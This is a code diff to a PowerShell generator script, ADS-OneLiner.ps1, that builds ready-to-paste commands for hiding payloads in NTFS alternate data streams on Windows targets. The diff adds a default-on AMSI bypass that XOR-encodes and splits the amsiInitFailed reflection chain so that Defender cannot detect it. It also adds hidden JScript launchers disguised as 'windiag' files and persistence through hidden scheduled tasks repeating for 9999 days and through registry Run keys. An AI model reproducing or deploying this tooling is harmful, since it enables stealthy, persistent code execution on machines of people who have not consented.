@@ -10,7 +10,16 @@
     NO full script upload needed - just copy/paste the generated commands.
 
 .PARAMETER Payload
-    Payload content (required unless -PayloadAtDeployment)
+    Payload content (required unless -PayloadFile or -PayloadAtDeployment).
+    WARNING: Passing payloads containing $ variables via -Payload on the command
+    line is unreliable because bash and pwsh both expand $ in double-quoted strings.
+    Use -PayloadFile instead for payloads containing $ variables.
+
+.PARAMETER PayloadFile
+    Path to a file containing the payload. The file is read verbatim with
+    Get-Content -Raw, bypassing all shell expansion issues. This is the
+    RECOMMENDED way to pass payloads containing $ variables, registry paths,
+    or any other special characters.
 
 .PARAMETER PayloadAtDeployment
     Prompt for payload on Windows target instead of baking it in
@@ -42,21 +51,26 @@
 .PARAMETER ManifestDir
     Manifest directory on Linux (default: ./manifests)
 
+.PARAMETER NoAmsi
+    Opt out of AMSI bypass (bypass is ON by default)
+
 .EXAMPLE
-    pwsh ADS-OneLiner.ps1 \
-      -Payload "Write-Host 'Test'" \
-      -ZeroWidthStreams \
-      -Persist task
+    # Simple payload (no $ variables):
+    pwsh ADS-OneLiner.ps1 -Payload "Write-Host 'Test'" -Persist task
+
+    # Payload with $ variables — use -PayloadFile to avoid shell expansion:
+    pwsh ADS-OneLiner.ps1 -PayloadFile ./my-payload.ps1 -Persist task -ZeroWidthStreams
 
 .NOTES
     Author: Qweary
-    Version: 2.0.0 (Command Generator)
+    Version: 2.2.4 (Command Generator - JScript Unicode ADS Path Fix)
     Requires: ADS-Dropper.ps1 in ./src/ or same directory
 #>
 
 [CmdletBinding()]
 param(
     [string]$Payload,
+    [string]$PayloadFile,
     [switch]$PayloadAtDeployment,
     
     [switch]$ZeroWidthStreams,
@@ -85,17 +99,202 @@ param(
     [int]$InstanceCount = 1,
     
     [string]$OutputFile = "ads-payload.txt",
-    [string]$ManifestDir = "./manifests"
+    [string]$ManifestDir = "./manifests",
+
+    # Opt out of AMSI bypass (bypass is ON by default)
+    [switch]$NoAmsi
 )
 
 Write-Host "`n╔═══════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
-Write-Host "║ ADS Minimal Command Generator                         ║" -ForegroundColor Cyan
+Write-Host "║ ADS Minimal Command Generator v2.2.4                  ║" -ForegroundColor Cyan
 Write-Host "╚═══════════════════════════════════════════════════════════╝`n" -ForegroundColor Cyan
 
-# Validate payload input
+# ============================================================
+# PAYLOAD INPUT VALIDATION
+# ============================================================
+
+# Handle -PayloadFile: read file contents, bypassing all shell expansion
+if ($PayloadFile) {
+    if (-not (Test-Path $PayloadFile)) {
+        Write-Error "PayloadFile not found: $PayloadFile"
+        exit 1
+    }
+    try {
+        $Payload = Get-Content $PayloadFile -Raw -ErrorAction Stop
+        Write-Host "[+] Payload read from file: $PayloadFile ($($Payload.Length) chars)" -ForegroundColor Green
+    } catch {
+        Write-Error "Failed to read PayloadFile: $_"
+        exit 1
+    }
+}
+
 if (-not $Payload -and -not $PayloadAtDeployment) {
-    Write-Error "Provide -Payload or use -PayloadAtDeployment"
+    Write-Error "Provide -Payload, -PayloadFile, or use -PayloadAtDeployment"
     exit 1
+}
+
+# ============================================================
+# EXPANSION CORRUPTION DETECTION
+# ============================================================
+# When a payload containing $ variables is passed via -Payload "..."
+# on the command line, bash and/or pwsh expand those variables to
+# empty strings BEFORE this script runs. Detect common corruption
+# patterns and warn the user to use -PayloadFile instead.
+# ============================================================
+if ($Payload -and -not $PayloadFile -and -not $PayloadAtDeployment) {
+    $corruptionHints = 0
+    # Pattern: "; ='value'" — a bare = where "$var='value'" was intended
+    if ($Payload -match ';\s*=\s*''') { $corruptionHints++ }
+    # Pattern: "Test-Path )" — empty argument where "$var" was intended
+    if ($Payload -match 'Test-Path\s*\)') { $corruptionHints++ }
+    # Pattern: "-Path  -" — empty -Path value (double space before next param)
+    if ($Payload -match '-Path\s{2,}-') { $corruptionHints++ }
+    # Pattern: parameter flags with no value where $true/$false was expected
+    if ($Payload -match '-\w+Monitoring\s+(-|;|$)') { $corruptionHints++ }
+    if ($Payload -match '-\w+Protection\s+(-|;|$)') { $corruptionHints++ }
+
+    if ($corruptionHints -ge 2) {
+        Write-Host ""
+        Write-Host "╔═══════════════════════════════════════════════════════════╗" -ForegroundColor Red
+        Write-Host "║ WARNING: Payload appears corrupted by shell expansion!   ║" -ForegroundColor Red
+        Write-Host "╚═══════════════════════════════════════════════════════════╝" -ForegroundColor Red
+        Write-Host ""
+        Write-Host "  The payload looks like `$ variables were expanded to empty" -ForegroundColor Yellow
+        Write-Host "  strings by bash or pwsh before this script received them." -ForegroundColor Yellow
+        Write-Host ""
+        Write-Host "  FIX: Save your payload to a file and use -PayloadFile:" -ForegroundColor White
+        Write-Host '    echo ''your payload here'' > payload.ps1' -ForegroundColor Gray
+        Write-Host '    pwsh ADS-OneLiner.ps1 -PayloadFile ./payload.ps1 ...' -ForegroundColor Gray
+        Write-Host ""
+        Write-Host "  Detected $corruptionHints corruption pattern(s)." -ForegroundColor DarkGray
+        Write-Host "  Continuing anyway (output will be broken)..." -ForegroundColor DarkGray
+        Write-Host ""
+    }
+}
+
+# ============================================================
+# AMSI BYPASS GENERATION FUNCTIONS
+# ============================================================
+# These run on Linux at generation time to produce XOR-encoded
+# byte arrays. The encoded data is embedded in the generated
+# script. On the Windows target, only byte arrays + a generic
+# XOR decode loop appear in the source text — no flagged strings
+# or reflection patterns. Each decoded fragment is IEXed
+# separately so no single AMSI scan event sees the full
+# .GetType().GetField().SetValue() chain.
+# ============================================================
+
+function New-XorKey {
+    <#
+    .SYNOPSIS
+        Generate a random XOR key (avoids 0x00 and common ASCII)
+    #>
+    # Range 0x30-0x7E avoids null and control chars
+    return [byte](Get-Random -Minimum 0x30 -Maximum 0x7F)
+}
+
+function ConvertTo-XorBytes {
+    <#
+    .SYNOPSIS
+        XOR-encode a string into a byte array string for embedding
+    #>
+    param([string]$Text, [byte]$Key)
+    $bytes = $Text.ToCharArray() | ForEach-Object { [byte]([int][char]$_ -bxor $Key) }
+    return ($bytes -join ',')
+}
+
+function New-AmsiBypassLayerA {
+    <#
+    .SYNOPSIS
+        Generates Layer A AMSI bypass code using XOR-encoded fragment splitting.
+        
+    .DESCRIPTION
+        Produces PowerShell code where the source text contains only:
+        - A byte XOR key
+        - A generic decode function
+        - Byte arrays (just numbers)
+        - IEX calls on decoded fragments
+        
+        No flagged strings, type names, or reflection patterns appear in
+        the source text. Each decoded fragment contains only ONE step of
+        the reflection chain, exploiting the fact that Defender does not
+        correlate across separate AMSI scan events.
+
+    .OUTPUTS
+        [string] PowerShell code ready for embedding in $minimalScript
+    #>
+    $xk = New-XorKey
+
+    # Four fragments using PowerShell dynamic dispatch: $obj."$method"(args)
+    # This avoids the PSMethod.Invoke() pitfall where passing $self as
+    # first arg triggers wrong method overloads (the "must not specify an
+    # assembly" bug). Each fragment is individually benign to AMSI.
+    $fragA = '$script:_ra=[Ref].Assembly;$script:_m1="Ge"+"tTy"+"pe"'
+    $fragB = '$script:_tp=$script:_ra."$($script:_m1)"(("Sys"+"tem.Mana"+"gement.Auto"+"mation."+"Am"+"si"+"Uti"+"ls"))'
+    $fragC = '$script:_m2="Get"+"Fie"+"ld";$script:_fd=$script:_tp."$($script:_m2)"(("am"+"siIn"+"itFa"+"iled"),("Non"+"Publ"+"ic,Sta"+"tic"))'
+    $fragD = '$script:_m3="Set"+"Val"+"ue";$script:_fd."$($script:_m3)"($null,$true)'
+
+    $encA = ConvertTo-XorBytes $fragA $xk
+    $encB = ConvertTo-XorBytes $fragB $xk
+    $encC = ConvertTo-XorBytes $fragC $xk
+    $encD = ConvertTo-XorBytes $fragD $xk
+
+    # Build the one-liner: decode function + try/catch around fragment IEX loop
+    $keyHex = "0x{0:X2}" -f $xk
+    return "`$_xk=$keyHex;function _xd([byte[]]`$d,[byte]`$k){-join(`$d|%{[char](`$_ -bxor `$k)})};try{@(,@($encA),@($encB),@($encC),@($encD))|%{IEX(_xd `$_ `$_xk)}}catch{}"
+}
+
+function New-AmsiBypassLayerB {
+    <#
+    .SYNOPSIS
+        Generates Layer B AMSI bypass for JScript wrapper context.
+        
+    .DESCRIPTION
+        Same XOR fragment approach but formatted as a PowerShell -Command
+        string that will be concatenated inside a JScript wrapper.
+        The JScript launches powershell.exe with this bypass prepended
+        to the actual payload execution.
+
+    .OUTPUTS
+        [string] PowerShell code suitable for JScript string concatenation.
+        Includes proper escaping for the JScript → PowerShell → execution chain.
+    #>
+    $xk = New-XorKey
+
+    $fragA = '$script:_ra=[Ref].Assembly;$script:_m1="Ge"+"tTy"+"pe"'
+    $fragB = '$script:_tp=$script:_ra."$($script:_m1)"(("Sys"+"tem.Mana"+"gement.Auto"+"mation."+"Am"+"si"+"Uti"+"ls"))'
+    $fragC = '$script:_m2="Get"+"Fie"+"ld";$script:_fd=$script:_tp."$($script:_m2)"(("am"+"siIn"+"itFa"+"iled"),("Non"+"Publ"+"ic,Sta"+"tic"))'
+    $fragD = '$script:_m3="Set"+"Val"+"ue";$script:_fd."$($script:_m3)"($null,$true)'
+
+    $encA = ConvertTo-XorBytes $fragA $xk
+    $encB = ConvertTo-XorBytes $fragB $xk
+    $encC = ConvertTo-XorBytes $fragC $xk
+    $encD = ConvertTo-XorBytes $fragD $xk
+
+    $keyHex = "0x{0:X2}" -f $xk
+
+    # For JScript context: this string will be concatenated inside a JScript
+    # string that builds a powershell.exe -Command "..." invocation.
+    # The $ signs need to survive: JScript → cmd.exe → PowerShell
+    # In the JScript here-string context of Build-DeployBlock, $ is literal
+    # (no JScript expansion), so we just need valid PowerShell syntax.
+    return "`$_xk=$keyHex;function _xd([byte[]]`$d,[byte]`$k){-join(`$d|%{[char](`$_ -bxor `$k)})};try{@(,@($encA),@($encB),@($encC),@($encD))|%{IEX(_xd `$_ `$_xk)}}catch{};"
+}
+
+function New-AmsiBypassForRegistry {
+    <#
+    .SYNOPSIS
+        Generates AMSI bypass for registry Run key value.
+        
+    .DESCRIPTION
+        Similar to Layer B but must be compact enough for a registry value
+        string. Uses the same XOR fragment approach.
+
+    .OUTPUTS
+        [string] PowerShell code for registry -Value parameter
+    #>
+    # Reuse Layer B format — it's already a single-line string
+    return New-AmsiBypassLayerB
 }
 
 # Locate ADS-Dropper.ps1
@@ -153,6 +352,11 @@ Write-Host "    Task: $($config.TaskName)" -ForegroundColor Gray
 if ($InstanceCount -gt 1) {
     Write-Host "    Instances: $InstanceCount (each gets unique path/stream/task)" -ForegroundColor Yellow
 }
+if (-not $NoAmsi) {
+    Write-Host "    AMSI Bypass: Enabled - XOR Fragment Splitting (Layer A + Layer B)" -ForegroundColor Yellow
+} else {
+    Write-Host "    AMSI Bypass: Disabled (-NoAmsi)" -ForegroundColor DarkGray
+}
 
 # Build minimal Windows commands
 Write-Host "[*] Building minimal deployment commands..." -ForegroundColor White
@@ -205,6 +409,28 @@ $minimalScript += @"
 
 "@
 
+# ============================================================
+# LAYER A: AMSI BYPASS FOR DEPLOYMENT SCRIPT
+# ============================================================
+# Uses XOR-encoded fragment splitting. The source text contains
+# ONLY byte arrays and a generic decode loop — no flagged strings
+# or reflection patterns. Each decoded fragment is IEXed in a
+# separate AMSI scan event, breaking the .GetType/.GetField/
+# .SetValue chain that Defender pattern-matches on.
+#
+# Generated fresh each run with a random XOR key, producing
+# unique byte sequences every time.
+# ============================================================
+if (-not $NoAmsi) {
+    $layerACode = New-AmsiBypassLayerA
+    Write-Host "[*] Layer A bypass generated (XOR key: random, $(($layerACode.Length)) chars)" -ForegroundColor DarkGray
+    $minimalScript += @"
+# Runtime evasion
+$layerACode
+
+"@
+}
+
 # Payload handling (computed ONCE, before any loop)
 if ($PayloadAtDeployment) {
     $minimalScript += @"
@@ -220,7 +446,10 @@ do{`$line=Read-Host;if(`$line){`$lines+=`$line}}while(`$line)
     $actualPayload = $Payload
     
     # Check if payload looks like a file path (doesn't contain newlines and is a valid path)
-    if (($Payload -notmatch "`n") -and (Test-Path $Payload -ErrorAction SilentlyContinue)) {
+    # NOTE: -PayloadFile is the preferred way to pass file-based payloads.
+    # This auto-detection is kept for backward compatibility but -PayloadFile
+    # should be used instead since it bypasses all shell expansion issues.
+    if (-not $PayloadFile -and ($Payload -notmatch "`n") -and (Test-Path $Payload -ErrorAction SilentlyContinue)) {
         Write-Host "[*] File detected: $Payload" -ForegroundColor Yellow
         Write-Host "[*] Reading file contents..." -ForegroundColor Yellow
         try {
@@ -232,13 +461,14 @@ do{`$line=Read-Host;if(`$line){`$lines+=`$line}}while(`$line)
         }
     }
     
-    # Escape the payload for embedding
-    $escapedPayload = $actualPayload -replace "'","''" -replace '`','``'
-    $minimalScript += @"
-# Payload
-`$pl='$escapedPayload'
-
-"@
+    # Escape the payload for embedding in a single-quoted string.
+    # Only apostrophes need escaping inside '...' — PowerShell does NOT
+    # expand $, `, or any other special chars inside single quotes.
+    $escapedPayload = $actualPayload -replace "'","''"
+    # IMPORTANT: Use string concatenation, NOT an expandable here-string,
+    # so that $ and ` in the payload are NOT expanded at generation time.
+    # The payload will be inside '...' on the target, keeping it literal.
+    $minimalScript += "# Payload`n" + '$pl=''' + $escapedPayload + '''' + "`n`n"
 }
 
 # Encryption handling (computed ONCE)
@@ -333,8 +563,21 @@ if(!(Test-Path `$hp)){ni `$hp -ItemType File -Force|Out-Null}
             # ============================================================
             # ENCRYPTED: JScript wrapper with inline decryption functions
             # ============================================================
+
+            # Build the AMSI bypass for Layer B (JScript wrapper)
+            $jsAmsiLine = ""
+            if (-not $NoAmsi) {
+                $layerBCode = New-AmsiBypassLayerB
+                $jsAmsiLine = @"
+    "$layerBCode" +
+
+"@
+            }
+
             $block += @"
 `$adsPath=`$hp+':'+`$sn
+`$_snEsc=(`$sn.ToCharArray()|%{'[char]0x{0:X4}'-f[int]`$_}) -join '+'
+`$_hpEsc=`$hp-replace'\\','\\\\'
 `$_jsBody=@'
 var shell = new ActiveXObject("WScript.Shell");
 var cmd = "powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"" +
@@ -352,18 +595,19 @@ var cmd = "powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -Execut
         "[Text.Encoding]::UTF8.GetString(`$p)" +
     "};" +
     "`$k=Get-HostKey;" +
-    "`$e=Get-Content '__ADSPATH__' -Raw;" +
-    "`$p=Dec `$e `$k;" +
+    "`$_sn=__SNEXPR__;" +
+    "`$e=Get-Content ('__HOSTPATH__:'+`$_sn) -Raw;" +
+$jsAmsiLine    "`$p=Dec `$e `$k;" +
     "IEX `$p" +
     "\"";
 shell.Run(cmd, 0, false);
 '@
-`$_jsBody=`$_jsBody.Replace('__ADSPATH__',(`$adsPath-replace'\\','\\'))
+`$_jsBody=`$_jsBody.Replace('__SNEXPR__',`$_snEsc).Replace('__HOSTPATH__',`$_hpEsc)
 `$_jsDir=Split-Path `$hp -Parent;if(-not `$_jsDir){`$_jsDir=`$env:ProgramData}
 `$_jsPath=Join-Path `$_jsDir ("windiag_`$(Get-Random).js")
 `$_jsBody|Out-File -FilePath `$_jsPath -Encoding ASCII -Force
 `$a=New-ScheduledTaskAction -Execute 'wscript.exe' -Argument "//B //E:JScript ```"`$_jsPath```""
-`$t1=New-ScheduledTaskTrigger -AtLogOn
+`$t1=New-ScheduledTaskTrigger -AtStartup
 `$t2=New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Minutes 5) -RepetitionDuration (New-TimeSpan -Days 9999)
 `$t=@(`$t1,`$t2)
 `$s=New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden
@@ -375,21 +619,34 @@ Register-ScheduledTask -TaskName `$tn -Action `$a -Trigger `$t -Settings `$s -Pr
             # ============================================================
             # UNENCRYPTED: JScript wrapper, simple IEX
             # ============================================================
+
+            # Build AMSI bypass for unencrypted Layer B
+            $jsAmsiLineUnenc = ""
+            if (-not $NoAmsi) {
+                $layerBCodeUnenc = New-AmsiBypassLayerB
+                $jsAmsiLineUnenc = @"
+    "$layerBCodeUnenc" +
+
+"@
+            }
+
             $block += @"
 `$adsPath=`$hp+':'+`$sn
+`$_snEsc=(`$sn.ToCharArray()|%{'[char]0x{0:X4}'-f[int]`$_}) -join '+'
+`$_hpEsc=`$hp-replace'\\','\\\\'
 `$_jsBody=@'
 var shell = new ActiveXObject("WScript.Shell");
 var cmd = "powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"" +
-    "IEX(Get-Content '__ADSPATH__' -Raw)" +
+$jsAmsiLineUnenc    "`$_sn=__SNEXPR__;IEX(Get-Content ('__HOSTPATH__:'+`$_sn) -Raw)" +
     "\"";
 shell.Run(cmd, 0, false);
 '@
-`$_jsBody=`$_jsBody.Replace('__ADSPATH__',(`$adsPath-replace'\\','\\'))
+`$_jsBody=`$_jsBody.Replace('__SNEXPR__',`$_snEsc).Replace('__HOSTPATH__',`$_hpEsc)
 `$_jsDir=Split-Path `$hp -Parent;if(-not `$_jsDir){`$_jsDir=`$env:ProgramData}
 `$_jsPath=Join-Path `$_jsDir ("windiag_`$(Get-Random).js")
 `$_jsBody|Out-File -FilePath `$_jsPath -Encoding ASCII -Force
 `$a=New-ScheduledTaskAction -Execute 'wscript.exe' -Argument "//B //E:JScript ```"`$_jsPath```""
-`$t1=New-ScheduledTaskTrigger -AtLogOn
+`$t1=New-ScheduledTaskTrigger -AtStartup
 `$t2=New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Minutes 5) -RepetitionDuration (New-TimeSpan -Days 9999)
 `$t=@(`$t1,`$t2)
 `$s=New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden
@@ -399,11 +656,17 @@ Register-ScheduledTask -TaskName `$tn -Action `$a -Trigger `$t -Settings `$s -Pr
 "@
         }
     } elseif ($Persist -eq 'registry') {
-        # Registry persistence: unchanged (no window-flash issue here)
-        $block += @"
-Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name `$tn -Value "powershell.exe -NoP -W Hidden -C `"IEX(gc '`$hp``:`$sn' -Raw)`""
-
-"@
+        # Registry persistence
+        if (-not $NoAmsi) {
+            $regBypass = New-AmsiBypassForRegistry
+            $regBypassSafe = $regBypass -replace "'","''"
+            $block += "`$_regByp='" + $regBypassSafe + "'`n"
+            $block += "`$_regCmd='powershell.exe -NoP -W Hidden -C `"' + `$_regByp + 'IEX(gc ' + [char]39 + `$hp + ':' + `$sn + [char]39 + ' -Raw)`"'`n"
+            $block += "Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name `$tn -Value `$_regCmd`n`n"
+        } else {
+            $block += "`$_regCmd='powershell.exe -NoP -W Hidden -C `"IEX(gc ' + [char]39 + `$hp + ':' + `$sn + [char]39 + ' -Raw)`"'`n"
+            $block += "Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name `$tn -Value `$_regCmd`n`n"
+        }
     }
 
     return $block
@@ -429,7 +692,6 @@ for(`$_i=0;`$_i -lt `$_instanceCount;`$_i++){
     if ($UseDeepPlacement -or $AttachToExisting) {
         $minimalScript += (Build-DeepPlacementCode) + "`n"
     } else {
-        # No deep placement — randomize a ProgramData path per instance
         $minimalScript += @'
 $hp = Join-Path $env:ProgramData (-join((65..90)+(97..122)|Get-Random -Count 8|ForEach-Object{[char]$_}))
 
@@ -509,7 +771,10 @@ if (-not $PayloadAtDeployment) {
         DeepPlacement     = $UseDeepPlacement.IsPresent
         AttachToExisting  = $AttachToExisting.IsPresent
         InstanceCount     = $InstanceCount
+        AmsiBypass        = (-not $NoAmsi)
+        AmsiBypassMethod  = if (-not $NoAmsi) { "XOR Fragment Splitting v2.2.4" } else { "Disabled" }
         PayloadHash       = $payloadHash
+        PayloadSource     = if ($PayloadFile) { "File: $PayloadFile" } else { "Command-line" }
         Operator          = $env:USER
         GeneratedOn       = hostname
         OutputFile        = $OutputFile
@@ -541,6 +806,8 @@ CONFIGURATION:
   Deep Placement: $($UseDeepPlacement.IsPresent)
   Attach to Existing: $($AttachToExisting.IsPresent)
   Instances: $InstanceCount$(if($InstanceCount -gt 1){" (each gets unique path/stream/task at runtime)"})
+  AMSI Bypass: $(-not $NoAmsi) (XOR Fragment Splitting - Layer A + Layer B)
+  Payload Source: $(if ($PayloadFile) { "File: $PayloadFile" } else { "Command-line" })
   
 PAYLOAD SIZE:
   Readable: $($minimalScript.Length) characters
@@ -587,7 +854,7 @@ Remove-Item '$($config.HostPath)' -Force
 `$_jsDir = Split-Path '$($config.HostPath)' -Parent
 if (`$_jsDir) { Get-ChildItem -Path `$_jsDir -Filter "windiag_*.js" -EA 0 | Remove-Item -Force }
 
-╔═══════════════════════════════════════════════════════════╗
+╔═══════════════════════════════════════════════════════════╝
 "@
 
 $outputContent | Out-File -FilePath $OutputFile -Encoding UTF8 -Force
@@ -601,6 +868,16 @@ Write-Host "✓ Minimal commands generated" -ForegroundColor Green
 Write-Host "✓ Output saved to: $OutputFile" -ForegroundColor Green
 if (-not $PayloadAtDeployment) {
     Write-Host "✓ Manifest saved for recovery" -ForegroundColor Green
+}
+if ($PayloadFile) {
+    Write-Host "✓ Payload loaded from file (shell-safe)" -ForegroundColor Green
+}
+if (-not $NoAmsi) {
+    Write-Host "✓ AMSI bypass: XOR Fragment Splitting (Layer A + Layer B)" -ForegroundColor Green
+    Write-Host "  - Layer A: deployment script (random XOR key per generation)" -ForegroundColor DarkGray
+    Write-Host "  - Layer B: scheduled task execution (separate random key)" -ForegroundColor DarkGray
+    Write-Host "  - Source text: only byte arrays + generic decode loop" -ForegroundColor DarkGray
+    Write-Host "  - No .GetType/.GetField/.SetValue chain in source" -ForegroundColor DarkGray
 }
 Write-Host ""
 Write-Host "READY TO DEPLOY!" -ForegroundColor Magenta
